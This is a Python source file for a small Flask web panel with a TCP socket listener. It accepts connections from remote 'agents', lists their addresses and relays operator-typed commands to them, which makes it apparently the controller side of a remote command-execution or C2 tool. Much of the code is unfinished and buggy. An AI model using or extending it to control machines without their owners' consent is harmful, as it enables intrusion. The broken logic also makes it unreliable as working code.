from os import close
import socket
import flask,time,threading
from flask import Flask,render_template,request


ip_address = '127.0.0.1'
port_number = 12345

thread_index = 0
THREADS = []
CMD_INPUT = {}
CMD_OUTPUT = {}
IPS = {}


    
app = Flask(__name__)

def handle_connection(connection,address,thread_index):
    
    global CMD_INPUT
    global CMD_OUTPUT
    
    msg = connection.recv(1024).decode()
    CMD_OUTPUT[thread_index] = msg
    print(msg)
    print(thread_index)
    print (CMD_INPUT)
    #while CMD_INPUT[thread_index] != 'quit' or CMD_INPUT[thread_index]!="":
    #while CMD_INPUT[thread_index] != 'quit': 
    while CMD_INPUT[thread_index] != 'quit' or CMD_INPUT[thread_index]!="":
        #msg = connection.recv(1024).decode()
        #CMD_OUTPUT[thread_index] = msg
        #print(msg)
        #print(thread_index) 
        #while True: 
        #    if CMD_INPUT[thread_index]!='':
        print (CMD_INPUT[thread_index])
        #please commentout this 21 -05-24
        msg = CMD_INPUT[thread_index]
        connection.send(msg.encode())        
                #msg = connection.recv(1024).decode()        
        print (msg)
                #CMD_OUTPUT[thread_index]=msg        
        print (CMD_OUTPUT)
        break       
    close_connection(connection)

def server_socket():
    ss = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    ss.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
    ss.bind((ip_address,port_number))     
    ss.listen(5) 
    global connection  
      
    global THREADS
    global IPS
    #global connection
    while True:
        connection,address = ss.accept()        
        thread_index = len(THREADS)        
        t = threading.Thread(target=handle_connection,args=(connection,address,len(THREADS)),name=f"{thread_index}")
        #global connection
        THREADS.append(t)
        IPS[thread_index]=address          
        print(f"IPSConnected to {IPS}")  
        print(f"Thrreads {THREADS}")   
        #return connection   

        t.start()  
def close_connection(connection):    
    connection.close()
    THREADS[thread_index]=''
    IPS[thread_index]=''
    CMD_INPUT[thread_index]=''
    CMD_OUTPUT[thread_index]=''

def create_app():  
       
    server_thread = threading.Thread(target=server_socket)   
    server_thread.start()
    
    

    @app.route("/threads")
    def threads():
        global THREADS
        global IPS
        return render_template('Thread.html',ips=IPS,threads=THREADS)

    @app.route("/<agentname>/executecmd")
    def executecmd(agentname):
        global THREADS
        global IPS
        return render_template('execute.html',name=agentname,ips=IPS,threads=THREADS)
    
    @app.route("/<agentname>/execute",methods=['GET','POST'])
    def execute(agentname):
        if request.method=='POST' :
            cmd= request.form['command']
            
            
            connection.send(cmd.encode())
            for i in THREADS:
                if agentname in i.name:
                    req_index = THREADS.index(i)
                    print (req_index)
                global CMD_INPUT
                global CMD_OUTPUT
                    
                    #connection.send(cmd.encode())
            CMD_INPUT[req_index] = cmd 
            time.sleep(5)
            CMD_OUTPUT[req_index]=connection.recv(1028).decode()
            Cmdoutput = CMD_OUTPUT[req_index]
            return render_template('execute.html',cmdoutput=Cmdoutput,Cmd=cmd,name=agentname)

    @app.route("/") 
    @app.route('/home')
    def home():
        return render_template('index.html')
    return app

if __name__ == '__main__':    
    app = create_app() 
    #app.debug =True
    app.run(IPS,THREADS)
    